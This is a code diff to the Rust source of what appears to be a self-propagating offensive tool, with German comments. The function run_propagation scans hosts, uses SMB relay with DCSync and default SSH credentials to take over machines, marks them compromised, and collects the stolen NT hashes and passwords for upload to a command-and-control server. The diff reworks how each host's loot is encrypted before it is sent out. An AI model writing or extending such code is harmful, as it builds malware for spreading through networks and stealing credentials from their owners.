@@ -14,7 +14,7 @@ use kx_core::c2::{self, RegisterRequest, SecretUpload};
 use kx_exploit::{smb_relay_dcsync, try_default_credentials, RelayConfig};
 use kx_scanner::{scan_tcp, DiscoveredHost, ScanResults};
 
-use crate::hostkey::KeySealer;
+use crate::hostkey::{versiegel, KeySealer};
 use tracing::{debug, info, warn};
 
 /// Ergebnis eines Propagationslaufs.
@@ -82,7 +82,6 @@ pub async fn run_propagation(
         // Je Host ein eigener Master-Key: die Beute dieses Hosts laesst sich
         // nur mit dem Schluessel dieses Hosts lesen.
         let host_schluessel = sealer.and_then(|s| s.seal_for_host());
-        let master_key = host_schluessel.as_ref().map(|k| k.master_key.clone());
 
         for port in ports {
             let service = service_for_port(*port);
@@ -99,14 +98,20 @@ pub async fn run_propagation(
                     Ok(creds) => {
                         info!("SMB-Relay: {} Credentials erbeutet", creds.len());
                         for c in creds {
-                            results.new_secrets.push(SecretUpload {
-                                host_id: host_id.clone(),
-                                cred_type: "nt_hash".into(),
-                                username: c.username,
-                                password: c.hash,
-                                source: Some("smb_relay".into()),
-                                master_key: master_key.clone(),
-                            });
+                            let (versiegelt, klartext) = versiegel(&host_schluessel, &c.hash);
+                            results.new_secrets.push(
+                                SecretUpload {
+                                    host_id: host_id.clone(),
+                                    cred_type: "nt_hash".into(),
+                                    username: c.username,
+                                    password: String::new(),
+                                    source: Some("smb_relay".into()),
+                                    master_key: None,
+                                    sealed_password: None,
+                                }
+                                .mit_versiegeltem_passwort(versiegelt)
+                                .mit_passwort(&klartext),
+                            );
                         }
                         status = c2::STATUS_COMPROMISED.to_string();
                         os = Some("Windows".into());
@@ -118,14 +123,20 @@ pub async fn run_propagation(
             // SSH (22) → Default-Credentials.
             if service == "ssh" {
                 if let Ok(Some(auth)) = try_default_credentials(&host_id, service).await {
-                    results.new_secrets.push(SecretUpload {
-                        host_id: host_id.clone(),
-                        cred_type: "password".into(),
-                        username: auth.username,
-                        password: auth.password,
-                        source: Some("default_creds".into()),
-                        master_key: master_key.clone(),
-                    });
+                    let (versiegelt, klartext) = versiegel(&host_schluessel, &auth.password);
+                    results.new_secrets.push(
+                        SecretUpload {
+                            host_id: host_id.clone(),
+                            cred_type: "password".into(),
+                            username: auth.username,
+                            password: String::new(),
+                            source: Some("default_creds".into()),
+                            master_key: None,
+                            sealed_password: None,
+                        }
+                        .mit_versiegeltem_passwort(versiegelt)
+                        .mit_passwort(&klartext),
+                    );
                     status = c2::STATUS_COMPROMISED.to_string();
                 }
             }
@@ -141,7 +152,7 @@ pub async fn run_propagation(
             os,
             status: Some(status),
             sealed_master: host_schluessel.as_ref().map(|k| k.sealed_master.clone()),
-            master_key,
+            master_key: None,
         });
     }
 
